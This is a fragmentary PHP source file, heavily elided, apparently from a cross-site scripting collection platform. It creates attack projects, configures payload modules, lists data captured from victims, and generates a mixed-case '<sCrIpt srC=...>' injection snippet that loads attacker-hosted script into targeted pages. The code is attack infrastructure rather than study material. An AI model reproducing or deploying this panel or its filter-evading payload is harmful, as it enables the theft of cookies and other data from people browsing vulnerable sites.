...
switch($act){
	...
	case 'create_submit':
		...
		if(empty($title)) ShowError('项目名称不能为空',URL_ROOT.'/xss.php?do=project&act=create');
		$db=DBConnect();
		//生成短网址字符
		...
		$projectId=$db->LastId();
		//ShowSuccess('创建成功');
		header("Location: ".URL_ROOT.'/xss.php?do=project&act=setcode&ty=create&id='.$projectId);
		break;
	case 'setcode':
		$db=DBConnect();
		$id=Val('id','GET',1);
			...
			foreach($modules as $mId){
				...
				if(!empty($module) && !empty($module['setkeys'])){
					...
					foreach($mSetKeys as $setkey){
						...
						if(!empty($setkeyV)){
							$setkeyV=urlencode($setkeyV);	//我知道这里这么做很麻烦，但是不要问我为什么这么做QQ：411161555
/* 							$setkeyV=str_replace("%3a",':',$setkeyV);
							$setkeyV=str_replace("%2f",'/',$setkeyV);
							$setkeyV=str_replace("%3f",'?',$setkeyV);
							$setkeyV=str_replace("%3d",'=',$setkeyV);
							$setkeyV=str_replace("%26",'&',$setkeyV);
							$setkeyV=str_replace("%3b",';',$setkeyV);
							$setkeyV=str_replace("%3A",':',$setkeyV);
							$setkeyV=str_replace("%2F",'/',$setkeyV);
							$setkeyV=str_replace("%3F",'?',$setkeyV);
							$setkeyV=str_replace("%3D",'=',$setkeyV);
		...
		if($ty=='create'){
			header("Location: ".URL_ROOT.'/xss.php?do=project&act=viewcode&ty=create&id='.$id);
		}else{
			ShowSuccess('操作成功');
		}
		break;
	case 'view':
		...
		$href = "xss.php?do=project&act=view&id={$id}";
		...
		//$conlist=$db->FirstValue("SELECT COUNT(*) FROM ".Tb('project_content')." WHERE projectId='{$id}' {$where} ORDER BY id DESC");
		//$nums=$conlist;
		//if(!$pageCurrent) $pageCurrent=1;  
		//$page_num=$pageCurrent-1;
		//$page_num=$page_num*$page_size;
		//$subPages=new SubPages($page_size,$nums,$pageCurrent,$sub_pages,"xss.php?do=project&act=view&id=$id&page=",2); 
		foreach($contents as $k=>$v){
			...
			if(!empty($contents[$k]['serverContent'])){
	...
	case 'viewcode':
		...
		$shortShow2=StripStr("<sCrIpt srC={$codeurl}></sCRipT>");
